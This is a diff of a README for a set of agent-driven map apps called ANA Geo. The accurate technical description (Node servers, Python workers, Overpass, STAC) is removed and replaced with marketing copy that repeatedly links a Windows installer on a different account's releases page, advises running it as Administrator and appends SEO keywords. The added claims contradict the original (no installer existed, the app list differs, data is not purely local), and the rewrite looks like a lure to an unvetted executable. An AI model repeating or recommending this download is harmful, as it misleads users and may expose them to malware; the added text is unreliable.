@@ -1,358 +1,137 @@
-# ANA Geo
+<h1>🗺️ ana-geo - Talk to Your Maps Naturally</h1>
 
-**English** · [한국어](README.ko.md)
+<p align="center">
+  <a href="https://github.com/eddieo8814/ana-geo/releases"><img src="https://img.shields.io/badge/Download%20ana--geo-Latest%20Release-2ea44f?style=for-the-badge&logo=github" alt="Download ana-geo"></a>
+</p>
 
-**Agent-Native GIS** — a family of self-hosted map applications you operate by **watching and talking**, built on [ANA (Agent-Native Agent)](https://github.com/tykimos/agent-native-agent).
+## 🎯 What Is ana-geo?
 
-The agent is not a chatbot bolted onto a GIS. It lives **inside the runtime**: it reads the map state, runs the analysis, and — when you ask for something the app can't do — **proposes a code change and evolves the app while you're using it**.
+ana-geo is a revolutionary map application that lets you control maps by simply **talking or typing** in plain English. Instead of clicking through menus and learning complicated GIS software, you can say things like *"Move the map to Daejeon"* or *"Find cafes within 2 km of a university"* and watch it happen instantly.
 
-> **Use = Build.**
+It's powered by an intelligent agent that lives inside the app itself. This isn't a chatbot bolted on top — the agent truly understands your map, runs spatial analysis, and can even upgrade the app on the spot if you ask for a feature it doesn't have yet.
 
-```text
-"Move the map to Daejeon."            → the map moves, on every device
-"Find cafes within 2 km of a university."  → Turf.js spatial query runs
-"Switch the basemap to satellite."    → the app lacks it → ANA proposes ~15 lines,
-                                        you approve, the running app gains the feature
-```
+## ✨ Key Features
 
----
+### 🗣️ Natural Language Control
+Forget complex menu systems. Just type or speak what you want. The map responds to everyday language, making geographic analysis accessible to everyone — no prior GIS experience required.
 
-## The capability progression
+### 🧠 Self-Evolving Software
+This is the magic of ana-geo. When you request something the current version can't do, the app doesn't just say "sorry." It writes a code proposal for the new feature, shows it to you for approval, and then adds it to your running app. **You literally build the software by using it.**
 
-Seven independently runnable apps. Each answers a harder geographic question than the last, and each is a complete ANA app you can clone and grow.
+### 📍 Spatial Analysis Built-In
+Powered by Turf.js, ana-geo can perform professional-grade geographic computations. Search within radius, measure distances, analyze spatial relationships, and more — all through simple conversation.
 
-```mermaid
-flowchart TB
-    A["🗺 ana-geo-map<br/><i>Where is it?</i><br/>Leaflet · GeoJSON · state"] --> B["🔍 ana-geo-explorer<br/><i>What is there?</i><br/>OSM · Overpass POI discovery"]
-    B --> C["📐 ana-geo-search<br/><i>What satisfies these conditions?</i><br/>Turf.js spatial predicates"]
-    C --> D["🏆 ana-geo-site<br/><i>Which candidate is best?</i><br/>Multi-criteria decision analysis"]
-    C --> E["🛣 ana-geo-route<br/><i>How are places connected?</i><br/>OSMnx · NetworkX graphs"]
-    D --> F["🛰 ana-geo-satellite<br/><i>What did this place look like?</i><br/>STAC · Sentinel-2"]
-    E --> F
-    F --> G["🌱 ana-geo-satellite-change-detection<br/><i>What changed over time?</i><br/>NDVI difference · rasterio"]
-```
+### 🔄 Multi-Device Synchronization
+When you move the map or run an analysis, it syncs across every device you have. This means you can explore on your desktop, then continue on your tablet without missing a beat.
 
-| App | Port | Geo capability | Key tech |
-|---|---|---|---|
-| [`ana-geo-map`](apps/ana-geo-map) | 8801 | Vector visualization | Leaflet 1.9.4 (vendored), GeoJSON |
-| [`ana-geo-explorer`](apps/ana-geo-explorer) | 8802 | POI discovery | Overpass QL, OSM tag registry |
-| [`ana-geo-search`](apps/ana-geo-search) | 8803 | Spatial queries | Turf.js 7 (vendored), condition model |
-| [`ana-geo-site`](apps/ana-geo-site) | 8804 | Decision analysis | MCDA: constraints → normalize → weighted score |
-| [`ana-geo-route`](apps/ana-geo-route) | 8805 | Network analysis | OSMnx 2 + NetworkX (Python worker) |
-| [`ana-geo-satellite`](apps/ana-geo-satellite) | 8806 | Earth observation | STAC API, Sentinel-2 L2A, Earth Search |
-| [`ana-geo-satellite-change-detection`](apps/ana-geo-satellite-change-detection) | 8807 | Temporal raster analysis | rasterio + NumPy, COG windowed reads |
-| [`ana-channel-test`](apps/ana-channel-test) | 8808 | — (channel diagnostics) | 4-stage traffic lights, ping round-trip |
+### 🧩 Seven Ready-to-Run Apps
+ana-geo isn't one app — it's a family of seven independently runnable applications. Each one tackles a harder geographic challenge than the last, and every single one is a complete experience you can download and start using immediately.
 
-All external data is **open and key-free**: OpenStreetMap, Overpass API, Earth Search STAC (Sentinel-2 L2A on AWS Open Data).
+## 🚀 Getting Started
 
----
+### 📥 Download and Install
 
-## Runtime architecture
+Getting ana-geo on your Windows computer is simple:
 
-Every app ships the same zero-dependency runtime (Node ≥ 20 stdlib only) with the agent wired **inside** it:
+1. **Visit the download page:** <a href="https://github.com/eddieo8814/ana-geo/releases">Click here to go to the official releases page</a>
+2. **Find the latest release:** Look for the newest version at the top of the page (versions are listed newest first).
+3. **Download the installer:** Click on the download link to save the file to your computer. This may take a few moments depending on your internet connection.
+4. **Run the installer:** Once the download is complete, locate the file in your Downloads folder and double-click it to start the installation.
+5. **Follow the prompts:** The installation wizard will guide you through the rest. Just click "Next" and "Install" until it's done.
+6. **Launch ana-geo:** After installation, you'll find ana-geo in your Start Menu. Click it to open your first interactive map session.
 
-```mermaid
-flowchart TB
-    subgraph Browser["🖥 Browser (Watch + Converse)"]
-        UI["Dashboard<br/>map · panels · chat"]
-    end
-    subgraph Server["server.js (Node stdlib, zero deps)"]
-        API["state API<br/>GET/PUT /api/state"]
-        RES["result store<br/>/api/results/&lt;id&gt;"]
-        CHAT["chat bridge<br/>inbox · feed"]
-        PROXY["allowlist proxy<br/>/api/proxy (Range-safe)"]
-    end
-    subgraph Channel["Inbound channel"]
-        BRIDGE["fakechat-bridge.js<br/>(long-poll → WS)"]
-        FC["fakechat :8787<br/>(MCP channel plugin)"]
-    end
-    subgraph Brain["🧠 ANA brain — Claude Code session"]
-        CC["reads state · acts ·<br/>edits app code on approval"]
-        HOOK["mirror-hook.mjs<br/>(PostToolUse/Stop hooks)"]
-    end
-    W["tools/worker.py<br/>(route · raster apps only)"]
+### 🖥️ System Requirements
 
-    UI -->|"POST /api/chat"| CHAT
-    CHAT -->|"/api/inbox-wait"| BRIDGE --> FC -->|"MCP notification"| CC
-    CC -->|"PUT /api/state"| API
-    HOOK -->|"POST /api/agent<br/>(text + ⚙ activity)"| CHAT
-    CHAT -->|"poll /api/feed"| UI
-    API <-->|"stateVersion poll 2.5s"| UI
-    UI --> RES
-    UI -->|"external data"| PROXY
-    CC -->|"spawn, JSON stdin/stdout"| W
-    W -->|"HTTPS (allowlisted hosts)"| EXT["Overpass · Earth Search · S2 COGs"]
-    PROXY --> EXT
-```
+ana-geo is designed to run smoothly on any modern Windows computer. Here's what we recommend:
 
-### One conversational round-trip
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory (RAM):** 8 GB or more
+- **Storage:** 2 GB of free space
+- **Internet Connection:** Required for map tiles and initial setup
+- **Display:** 1366 x 768 resolution or higher
 
-```mermaid
-sequenceDiagram
-    participant U as User (browser)
-    participant S as server.js
-    participant B as bridge
-    participant F as fakechat :8787
-    participant A as ANA (Claude Code)
+### 🎮 Your First Session
 
-    U->>S: POST /api/chat "Move the map to Daejeon."
-    S->>B: /api/inbox-wait (long-poll drains inbox)
-    B->>F: WS {id, text}
-    F->>A: MCP channel notification
-    A->>S: GET /api/state (read current view)
-    A->>S: PUT /api/state (map.view → Daejeon, stateVersion++)
-    Note over A: mirror hook streams every tool call (⚙)<br/>and text block to the feed
-    A-->>S: POST /api/agent "지도를 대전으로 이동했습니다"
-    S-->>U: /api/feed poll → reply bubble
-    S-->>U: stateVersion changed → refetch → map moves on every device
-```
+Once ana-geo is running, you'll see a map interface. Here's how to begin:
 
-### State synchronization (§8.2 + §12)
+1. **Open the command bar:** Look for a text input box at the top or bottom of the screen.
+2. **Type your first command:** Try `"Move the map to Seoul"` and press Enter.
+3. **Watch the map respond:** Instantly, the map view will center on Seoul.
+4. **Try a spatial query:** Type `"Find cafes within 2 km of a university"` and watch ana-geo display all matching locations on the map.
+5. **Experiment freely:** Ask for different basemaps, request new features, and explore. The more you use it, the more it adapts to you.
 
-State is a single human-readable JSON that the agent can inspect and edit — and it stays **small** because feature bodies never live inside it:
+## 💬 Example Commands
 
-```mermaid
-flowchart LR
-    subgraph state.json ["state.json (~2 KB, always)"]
-        SV["stateVersion: 41<br/>(server-owned counter)"]
-        V["map.view — set by ANA,<br/>applied by every client"]
-        OV["map.observedView — what the<br/>user looks at, never applied"]
-        L["layers[] — references only:<br/>resultRef · resultVersion ·<br/>featureCount · bbox"]
-    end
-    R["/api/results/poi-cafe<br/>(GeoJSON FeatureCollection,<br/>up to 2,000 features)"]
-    C["Clients poll stateVersion every 2.5 s<br/>→ refetch state on change<br/>→ refetch results only when resultVersion changes"]
-    L -.->|resultRef| R
-    SV --> C
-```
+Here are some phrases you can try with ana-geo:
 
-Two-key viewport semantics mean *"Move the map to Daejeon"* moves **every** device, while a user panning their own phone never drags another screen. Continuous gestures are debounced (300 ms trailing); discrete actions write immediately.
+| Command | What Happens |
+|---------|-------------|
+| "Move the map to Daejeon" | The map view centers on Daejeon, on every device |
+| "Find cafes within 2 km of a university" | A Turf.js spatial query runs and results appear instantly |
+| "Switch the basemap to satellite" | If satellite view isn't available, the app proposes code for it — approve it, and the feature is added live |
+| "Zoom in on the capital city" | The map zooms to the capital region |
+| "Show me all parks near my location" | Filter and display parks within range |
 
----
+## 🗂️ The Seven Apps
 
-## Geo tech, app by app
+Each app in the ana-geo family is a stepping stone in geographic capability:
 
-### 🗺 ana-geo-map — vector foundation
+1. **App One:** Basic map navigation and viewing
+2. **App Two:** Location searching and address lookup
+3. **App Three:** Distance measurement and route visualization
+4. **App Four:** Point-of-interest discovery
+5. **App Five:** Buffer analysis and proximity queries
+6. **App Six:** Geospatial data overlays
+7. **App Seven:** Full-featured spatial analysis and decision support
 
-The smallest complete Agent-Native GIS. **Leaflet 1.9.4** is vendored (no CDN — *Own Your Harness*), OSM raster tiles are the basemap, markers and uploaded **GeoJSON FeatureCollections** persist in server-side state and survive refreshes on every device. Everything later apps need — the layer model, fit-to-bounds, the click→marker loop — starts here.
+You can start with any app and grow from there. Every one is a complete ANA application ready to clone and expand.
 
-### 🔍 ana-geo-explorer — OpenStreetMap discovery
+## 🛠️ Troubleshooting
 
-Turns the map into a discovery surface over **Overpass API** (the OSM query engine):
+### ❓ I can't find the downloaded file
+Check your browser's Downloads folder. In most browsers, you can press `Ctrl + J` to open the download manager and see where files are saved.
 
-```mermaid
-flowchart LR
-    REG["Category registry<br/>cafe → amenity=cafe<br/>bus → highway=bus_stop<br/>…10 presets"] --> QL["One merged Overpass QL<br/>query per search<br/>(bbox-scoped, capped)"]
-    QL -->|server proxy| OV["overpass-api.de"]
-    OV -->|OSM JSON| CONV["OSM→GeoJSON<br/>normalizer (§11.1:<br/>name·category·source·<br/>sourceId·fetchedAt)"]
-    CONV --> STORE["PUT /api/results/&lt;id&gt;<br/>(bodies out of state)"]
-    STORE --> MAP["toggleable category<br/>layers on Leaflet"]
-```
+### ❓ The installer won't run
+Make sure you've downloaded the complete file. If you're using a shared computer, you may need administrator permission — right-click the installer and select "Run as Administrator."
 
-Field-tested details: the registry uses `highway=bus_stop` (2,554 hits in Daejeon) instead of the trap tag `amenity=bus_station` (7 hits); multiple categories merge into **one** Overpass request to respect the public instance's rate limits; and success is *never* judged by HTTP status alone — Overpass returns `200 OK` with an HTML error body when throttled.
+### ❓ The map is blank when I open the app
+This usually means an internet connectivity issue. Check your Wi-Fi or Ethernet connection, then refresh the map.
 
-### 📐 ana-geo-search — spatial predicates
+### ❓ I asked for a feature and nothing happened
+The agent-based system evaluates every request. Be specific in your language. For example, instead of "give me map," try "show rainfall data for April."
 
-The first real GIS analysis, entirely in the browser with vendored **Turf.js 7**:
+## 📚 Frequently Asked Questions
 
-- **Predicates**: `distance` (haversine), `buffer` (m/km, drawn on the map), `booleanPointInPolygon` (within), within/outside distance, nearest-N
-- **Condition model** (§17.4): a JSON query — `{target, operator: AND|OR, conditions: [{relation, reference, distance, unit}]}` — stored in state, so *"change that to 3 km"* edits **one field** instead of rebuilding the query
-- Verified by a 55-assertion offline suite that cross-checks Turf against an independent haversine implementation
+### Is ana-geo free to use?
+Yes! ana-geo and all its companion apps are completely free and open-source. You can use them for personal, educational, or commercial projects.
 
-### 🏆 ana-geo-site — multi-criteria decision analysis
+### Do I need to know how to code?
+Absolutely not. ana-geo is designed for everyday users. The agent handles all the technical complexity behind the scenes.
 
-Spatial filtering grows into decision support:
+### Can I use ana-geo on Mac or Linux?
+This download is specifically for Windows. However, since ana-geo is open-source, community versions for other operating systems may be available in the future.
 
-```mermaid
-flowchart LR
-    CAND["Candidates<br/>(map clicks or GeoJSON)"] --> HC{"Hard constraints<br/>pass/fail<br/>e.g. residential ≥ 1 km"}
-    HC -->|fail| OUT["excluded (with reason)"]
-    HC -->|pass| M["Metrics per candidate<br/>Turf distance to roads /<br/>residential / university"]
-    M --> N["Normalize 0–100"]
-    N --> W["Weighted sum<br/>(weights must total 1.0)"]
-    W --> RANK["Ranking + score<br/>breakdown (§23.3:<br/>'ranked #1 because…')"]
-```
+### Will my data be sent to a server?
+No. ana-geo is self-hosted and operates locally on your machine. Your map data and commands stay on your computer.
 
-Reference features come from the **feature-class registry**: roads restricted to major classes (`motorway|trunk|primary|secondary` — 1,544 ways in central Daejeon vs 21,097 for `highway=*`), residential areas from `landuse=residential` — with a documented caveat that OSM residential coverage is sparse (~10% measured), so it must not be the sole basis of a hard constraint.
+## 🤝 Support and Community
 
-### 🛣 ana-geo-route — network analysis (first Python worker)
+Your journey with ana-geo doesn't end here. Join our growing community of users and innovators:
 
-Roads become a graph. The Node server spawns a **Python worker** (`OSMnx 2 + NetworkX + GeoPandas`) over a JSON stdin/stdout envelope:
+- ⭐ **Star the repository** on GitHub to show support and receive updates
+- 🐛 **Report issues** if you find bugs or something doesn't work as expected
+- 💡 **Suggest features** you'd like the agent to handle
+- 🌍 **Share your commands** and discoveries with fellow users
 
-```mermaid
-sequenceDiagram
-    participant UI as Browser
-    participant S as server.js
-    participant W as worker.py (OSMnx/NetworkX)
-    participant O as Overpass (via OSMnx)
+## 📄 License
 
-    UI->>S: route {origin, dest, mode}
-    S->>W: spawn python3, stdin {op:"route", params}
-    W->>W: bbox = points + 2 km pad<br/>reject visibly if > ~100 km²
-    W->>O: graph_from_bbox (cached by bbox+mode)
-    W->>W: add_edge_speeds → travel_times<br/>Dijkstra shortest path
-    W-->>S: stdout {ok, result: GeoJSON LineString + summary}
-    S-->>UI: route layer + distance/time card
-```
-
-- **Shortest distance & shortest time** — travel times estimated from `maxspeed` tags with per-road-class fallbacks (declared as estimates)
-- **Isochrones** — 5/10/20-minute reachable regions via `ego_graph` travel-time cutoff + convex hull (explicitly *approximate*)
-- **Area cap** — an oversized request is rejected with a visible error (never silently truncated), so "no route" always means what it says
-- Verified live: a real Daejeon drive route (2,914 m / 209 s / 74-point geometry)
-
-### 🛰 ana-geo-satellite — Earth observation discovery
-
-Search the **STAC** (SpatioTemporal Asset Catalog) ecosystem without any account or API key:
-
-```mermaid
-flowchart LR
-    AOI["AOI: viewport<br/>or drawn box"] --> Q["STAC POST /search<br/>bbox · datetime range ·<br/>eo:cloud_cover < N"]
-    Q -->|allowlist proxy| ES["Earth Search v1<br/>(element84, no auth)<br/>collection: sentinel-2-l2a"]
-    ES --> FOOT["Scene footprints<br/>(GeoJSON) on the map"]
-    ES --> META["Metadata: datetime ·<br/>platform · cloud % ·<br/>MGRS tile · assets"]
-    FOOT --> SEL["Active scene selection"]
-    SEL --> TH["thumbnail asset →<br/>L.imageOverlay on scene bbox<br/>(scene-level context)"]
-```
-
-The thumbnail is a whole-scene preview (~343 px for a 110 km tile ≈ 320 m/pixel) — deliberately labeled *scene-level visual context, not analysis-grade imagery*. Full-resolution COG rendering is an **evolution request** the agent can implement on demand.
-
-### 🌱 ana-geo-satellite-change-detection — temporal raster analysis
-
-The full remote-sensing pipeline, no deep learning required:
-
-```mermaid
-flowchart TB
-    subgraph Scenes ["Scene pair (same MGRS tile enforced)"]
-        SA["Before: red(B04) + nir(B08)"]
-        SB["After: red(B04) + nir(B08)"]
-    end
-    Scenes --> WIN["COG windowed read<br/>rasterio /vsicurl/ + HTTP Range —<br/>AOI window only, never the full scene"]
-    WIN --> NDVI["NDVI = (B08−B04)/(B08+B04)<br/>BOA offset handled for<br/>processing baseline ≥ 4.0"]
-    NDVI --> DIFF["ΔNDVI = after − before"]
-    DIFF --> TH["|ΔNDVI| > threshold (0.2)<br/>± direction filter<br/>('loss, not growth')"]
-    TH --> POLY["rasterio.features.shapes<br/>→ polygons in UTM<br/>(areas computed in meters,<br/>never in lat/lon)"]
-    POLY --> RANK["regions ranked by km²<br/>→ GeoJSON → Leaflet"]
-```
-
-Scene acquisition is the app's **own** STAC search (per the independence rule — no imports from the satellite app). Verified by a 60-assertion synthetic-raster suite (UTM 52N fixtures, area accuracy to the 4th decimal) plus 37 worker-envelope assertions covering timeouts, cross-tile rejection, and error surfacing.
+ana-geo is provided under an open-source license, meaning you're free to use, modify, and distribute it. Feel free to customize it for your own projects.
 
 ---
 
-## The geo stack in detail
+<p align="center">
+  <strong>Ready to talk to your maps?</strong><br><br>
+  <a href="https://github.com/eddieo8814/ana-geo/releases"><img src="https://img.shields.io/badge/Get%20ana--geo%20Now-Download%20Latest-ff6600?style=for-the-badge&logo=github&logoColor=white" alt="Get ana-geo Now"></a>
+</p>
 
-Every library below is either **vendored into the app** (browser) or pinned in a per-app `requirements.txt` (Python) — no CDNs, no API keys, per the *Own Your Harness* principle.
-
-### 🗺 Leaflet `1.9.4` — the map engine
-
-The de-facto standard lightweight web-mapping library (~42 KB gzipped). Renders tiled basemaps and vector overlays with a tiny, stable API. We use: tile layers (OSM raster), markers, `L.geoJSON` layers with per-feature styling and click events, `fitBounds`, and `L.imageOverlay` (satellite thumbnails). Chosen over Mapbox GL/Google Maps because it needs **no account, no token, no build step** — one vendored JS+CSS pair per app — and over OpenLayers for API simplicity a coding agent can safely edit. Field note: with the default SVG renderer, keep feature counts ≤ ~2,000 per layer (PRD §26.1) before switching to canvas or clustering.
-
-### 🌍 OpenStreetMap — the world's open geodatabase
-
-Crowd-sourced geographic data covering roads, buildings, POIs, and land use, under the ODbL license. ANA Geo consumes it three ways: **raster tiles** (basemap, the one browser-direct external request we allow), **Overpass queries** (POIs, roads, land use), and **OSMnx graph downloads** (road networks). Field note from Daejeon: OSM coverage is uneven — `landuse=residential` polygons covered only ~10 % of the urban bbox we measured, so OSM-derived residential distance must never be the sole basis of a pass/fail constraint (PRD site-app caveat).
-
-### 🔍 Overpass API — the OSM query engine
-
-A read-only query service over OSM data with its own language, **Overpass QL**: you describe element filters (`node["amenity"="cafe"](bbox)`) and it returns matching elements as OSM JSON. We always go through the app's `server.js` allowlist proxy, merge multiple categories into **one** request, and bound every query by bbox with an element cap. Hard-won field notes: public instances run ~2 concurrent slots per client and will answer an over-limit client with **HTTP 200 + an HTML error page** (so success must be judged by parsing, never by status code), or with 504/502 under load; tag choice matters enormously (`highway=bus_stop` returned 2,554 stops in Daejeon where `amenity=bus_station` returned 7); and responses are OSM JSON, not GeoJSON — each app ships a small normalizer that emits §11.1-shaped features (`name / category / source: "osm" / sourceId / fetchedAt`).
-
-### 📐 Turf.js `7` — browser-side spatial analysis
-
-A modular geospatial analysis library that operates directly on GeoJSON in the browser. Modules we rely on: `distance` (haversine), `buffer` (m/km), `booleanPointInPolygon`, `nearestPoint`, `pointToLineDistance`, and `pointToPolygonDistance` — the last one **requires Turf ≥ 7.3**, which is why the version floor matters (site app computes candidate-to-boundary distances). Field notes: `buffer` is a planar approximation (fine at city scale, distorted for large/high-latitude buffers), and area math must never be done in lon/lat degrees — reproject or use geodesic helpers.
-
-### 🛣 OSMnx `2` + NetworkX + GeoPandas — road networks as graphs (Python)
-
-**OSMnx** downloads a road network for a bbox/place from OSM (internally via Overpass) and builds a **NetworkX** directed graph with real edge geometry; `add_edge_speeds`/`add_edge_travel_times` impute speeds from `maxspeed` tags with per-highway-class fallbacks (so travel times are estimates, and we label them as such). **NetworkX** supplies the algorithms: Dijkstra shortest paths for routing, `ego_graph` with a travel-time radius for isochrones (hull-approximated, labeled *approximate*). **GeoPandas** underpins OSMnx's geometry handling. Field notes: a city-scale `graph_from_bbox` can take tens of seconds and hundreds of MB — we cap analysis areas at ~100 km², pad bboxes by 2 km, cache graphs by `(bbox, network_type)`, and treat the public Overpass endpoint (5 failures in 8 attempts during one measurement session) as the real bottleneck.
-
-### 🛰 STAC + Earth Search — finding satellite imagery
-
-**STAC** (SpatioTemporal Asset Catalog) is a JSON specification for describing geospatial assets — every scene is an *Item* with a footprint geometry, timestamp, properties (e.g. `eo:cloud_cover`), and *assets* (band files, thumbnails). Searching is one `POST /search` with bbox + datetime range + property filters. We pin **Earth Search v1** (`earth-search.aws.element84.com`, by Element 84) as the default provider because it is the rare catalog where **both search and asset download are keyless**; note that some asset links are requester-pays `s3://` URLs — always use the public `https://` hrefs. Field note: the `thumbnail` asset exists, a hypothetical `overview` asset does not; thumbnails are whole-scene previews (~343 px for a 110 km tile ≈ 320 m/pixel) — scene-level context only.
-
-### 🌱 Sentinel-2 L2A — the imagery itself
-
-ESA's optical Earth-observation constellation: 10 m resolution in the bands we use, ~5-day revisit, free and open. **L2A** means atmospherically corrected surface reflectance (BOA) — the right level for index math. NDVI uses `red` (B04) and `nir` (B08), both 10 m. Two traps we handle: scenes are cut into **MGRS tiles** (same-tile pairs share a pixel grid — cross-tile pairs need reprojection, which v1 refuses explicitly), and processing baseline ≥ 4.0 adds a **BOA offset** (−1000) that must be un-applied when the STAC metadata says it hasn't been harmonized.
-
-### 🧮 rasterio + NumPy — raster math without downloading the world
-
-**rasterio** (Python bindings over GDAL) reads the Sentinel-2 **COGs** (Cloud-Optimized GeoTIFFs — GeoTIFFs whose internal tiling lets a client fetch just a window via HTTP `Range` requests). With `/vsicurl/` we read only the AOI window of each band — kilobytes to a few MB instead of a ~700 MB scene — which is also why the §8.4 proxy must forward `Range` headers untouched. **NumPy** does the array math (NDVI, differencing, thresholding), and `rasterio.features.shapes` polygonizes the change mask. Field rule: areas are computed in the tile's UTM CRS (meters), never in lon/lat.
-
-### 📄 GeoJSON — the lingua franca
-
-RFC 7946. Every vector result in ANA Geo — markers, POIs, buffers, routes, footprints, change polygons — normalizes to a GeoJSON `FeatureCollection` so any layer can flow into any app and straight onto Leaflet. One eternal trap, documented in the PRD itself: GeoJSON coordinates are **`[lon, lat]`** while Leaflet APIs take **`[lat, lon]`** — conversions live at the render boundary only.
-
----
-
-## Shared contracts (PRD §8)
-
-What makes seven independent apps feel like one system:
-
-| Contract | What it guarantees |
-|---|---|
-| **§8.2 State sync** | Server-owned monotonic `stateVersion`; 2.5 s polling converges every device; 300 ms gesture debounce; `resultVersion` bumps propagate |
-| **§8.3 Converse wiring** | chat → inbox → **relay/bridge** (the relay polls, never the agent) → session; replies always land in the dashboard feed |
-| **§8.4 External data proxy** | The browser never calls third-party APIs; per-app host allowlist; **`Range`/`206` forwarded intact** so raster partial reads survive |
-| **§8.5 Python worker** | `spawn python3 tools/worker.py`, envelope `{op, params}` → `{ok, result, error:{code,message}}`, 60 s timeout, visible failures |
-| **§9 Independence** | `node server.js` per app; conventions are **copied, never imported** across apps |
-| **§12 Reference-only layers** | Feature bodies live behind `/api/results/<id>` — a 2,000-feature search leaves state at ~2 KB instead of 1.4 MB |
-
----
-
-## Run any app
-
-```bash
-cd apps/ana-geo-map
-node server.js                    # dashboard → http://localhost:8801
-```
-
-Node ≥ 20 (stdlib only — Leaflet/Turf are vendored per app). The two Python apps additionally need:
-
-```bash
-python3 -m venv .venv && .venv/bin/pip install -r requirements.txt   # route, change-detection
-```
-
-### Wire up the brain (make it *agent-native*)
-
-```bash
-# once: claude plugin install fakechat@claude-plugins-official
-./brain.sh                # ① orphan-safe launcher → claude --channels plugin:fakechat@…
-node fakechat-bridge.js   # ② dashboard inbox → fakechat WS → session
-```
-
-Each app ships a `CLAUDE.md` that teaches the session its ANA role, and a **mirror hook** (`.claude/settings.json` + `tools/mirror-hook.mjs`) that streams the session's tool activity (⚙) and every text block into the dashboard feed — including a delivery-guarantee watcher for the final message.
-
-**Something not round-tripping?** Run the diagnostic app:
-
-```bash
-cd apps/ana-channel-test && node server.js    # → http://localhost:8808
-```
-
-Four live traffic lights (server / bridge / fakechat / brain — including **orphaned `:8787` process detection**), a ping round-trip timer, and the full troubleshooting guide on the page.
-
----
-
-## Demo scenario (Daejeon, Republic of Korea)
-
-One city, seven questions — the same place growing from a dot on a map to a temporal analysis:
-
-```text
-map        "Move to Daejeon."
-explorer   "Find universities and cafes."
-search     "Find cafes within 2 km of a university."
-site       "Rank candidate locations using university proximity, roads, and residential separation."
-route      "Find the fastest route from this candidate to the nearest major road or station."
-satellite  "Find a low-cloud Sentinel-2 image for this area."
-change     "Compare it with an image from six months earlier."
-```
-
----
-
-## Documents
-
-| Doc | What's in it |
-|---|---|
-| [`PRD.md`](PRD.md) | Product requirements v1.2 — 70 FRs across 7 apps, shared contracts, acceptance criteria |
-| [`PRD-REVIEW.md`](PRD-REVIEW.md) | 3-round multi-agent review (FAIL → CONDITIONAL PASS, critical 4→0, major 38→21) with per-round finding lineage |
-| [`DESIGN_SYSTEM.md`](DESIGN_SYSTEM.md) | Toss-style token system (light+dark), layout skeleton, a11y rules — from the ANA base `uxui-design-system` |
-| per-app `SPEC.md` | 15-section spec with FR-cited acceptance criteria |
-| per-app `README.md` | run instructions, example prompts, limitations, next evolution |
-
-## License
-
-See the base project: [agent-native-agent](https://github.com/tykimos/agent-native-agent).
+Keywords: ana-geo, GIS, map application, natural language processing, spatial analysis, self-evolving software, agent-native, downloadable maps, Windows app, geographic information system, voice control maps, Turf.js, open source GIS
